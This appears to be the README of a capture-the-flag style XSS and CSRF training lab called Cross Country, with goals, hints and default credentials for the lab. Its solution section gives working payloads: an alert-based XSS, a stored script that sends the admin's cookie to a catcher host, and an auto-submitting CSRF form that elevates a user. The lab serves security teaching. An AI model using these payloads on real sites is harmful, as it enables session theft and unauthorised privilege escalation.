# Cross Country


## About

Cross country is a cross-site scripting and cross-site request forgery challenge.

Links:
[CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))


## Goal

Try to:
1. Get a reflected XSS Attack
2. Get a stored XSS Attach
3. Get the Admin's cookie
4. Make a registered user an administrator

## Hints

* Look at the posts
* Look at the admin message section
* Look at elevating a user
* What happens if you try to register a user that already exists?


## User Accounts:

| User  | Password|
|-------|---------|
|admin  | secret  |
|foo    | bar     |


## Solution:

Reflected XSS: registering a pre-existing user
```javascript
<script>alert(1);</script>
```

Stored XSS: Stealing the admin cookie by sending an admin message:
```javascript
<script>img=new Image();img.src="http://127.0.0.1:5001/catch/"+document.cookie</script>
```

Stored XSS: script alert in new post:
```javascript
<script>alert(1);</script>
```

CSRF: Elevating a user
Create a user using the register page, and log in as the admin, and visit this page:
```html
<form method='POST' action='http://<cross country ip>/elevate' id="csrf-form">
  <input type='hidden' name='username' value='<user you created>'>
  <input type='submit' value='submit'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
```
